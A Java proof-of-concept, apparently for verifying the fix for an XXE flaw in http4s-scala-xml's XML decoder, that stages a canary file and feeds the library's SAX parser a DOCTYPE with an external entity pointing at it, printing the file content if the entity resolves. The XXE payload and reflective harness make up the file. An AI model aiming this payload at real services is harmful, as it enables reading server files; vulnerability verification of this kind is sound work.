import java.io.File;
import java.io.FileOutputStream;
import java.io.StringReader;
import java.lang.reflect.Method;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.InputSource;
import org.xml.sax.helpers.DefaultHandler;

public class Poc {
    public static void main(String[] a) throws Exception {
        // The XXE file-disclosure primitive reads files off the local filesystem.
        // Stage the success token into a file so a successful external-entity
        // resolution is what actually surfaces it. We never print the token
        // directly; it can only reach stdout via the parser resolving the entity.
        String canary = System.getenv("POC_CANARY");
        File secret = File.createTempFile("poc_canary", ".txt");
        secret.deleteOnExit();
        try (FileOutputStream fos = new FileOutputStream(secret)) {
            fos.write(canary == null ? new byte[0] : canary.getBytes("UTF-8"));
        }

        // Malicious body: a DOCTYPE declaring an external general entity that
        // points at the staged file. This is exactly the kind of untrusted XML
        // an application would feed to http4s-scala-xml's EntityDecoder[F, Elem].
        String uri = secret.toURI().toString();
        String xml =
            "<?xml version=\"1.0\"?>\n" +
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"" + uri + "\"> ]>\n" +
            "<foo>&xxe;</foo>";

        // Obtain the exact SAXParserFactory that http4s-scala-xml's Elem decoders
        // parse with. This is the object the CVE-2026-61741 fix (0.24.1) changes:
        //   pre-patch:  SAXParserFactory.newInstance  (no hardening) -> DOCTYPE and
        //               external general entities resolve with JDK defaults.
        //   post-patch: FEATURE_SECURE_PROCESSING + disallow-doctype-decl + external
        //               entities disabled -> the parse below throws a SAXParseException.
        Class<?> pkg = Class.forName("org.http4s.scalaxml.package$");
        Object module = pkg.getField("MODULE$").get(null);
        Method saxFactoryGetter;
        try {
            saxFactoryGetter = pkg.getMethod("saxFactory");
        } catch (NoSuchMethodException e) {
            saxFactoryGetter = pkg.getDeclaredMethod("saxFactory");
        }
        saxFactoryGetter.setAccessible(true);
        SAXParserFactory factory = (SAXParserFactory) saxFactoryGetter.invoke(module);

        // Capture only character data produced during parsing. On the vulnerable
        // build the external entity is fetched and its bytes (the staged token)
        // are delivered here as the text content of <foo>.
        final StringBuilder disclosed = new StringBuilder();
        SAXParser parser = factory.newSAXParser();
        parser.parse(new InputSource(new StringReader(xml)), new DefaultHandler() {
            @Override
            public void characters(char[] ch, int start, int length) {
                disclosed.append(ch, start, length);
            }
        });

        // Reached only if the DOCTYPE + external entity actually resolved, i.e. the
        // XXE fired. 'disclosed' is the file content exfiltrated via the entity.
        // On a patched build the parse above throws before we get here, so nothing
        // is emitted.
        System.out.print(disclosed.toString());
    }
}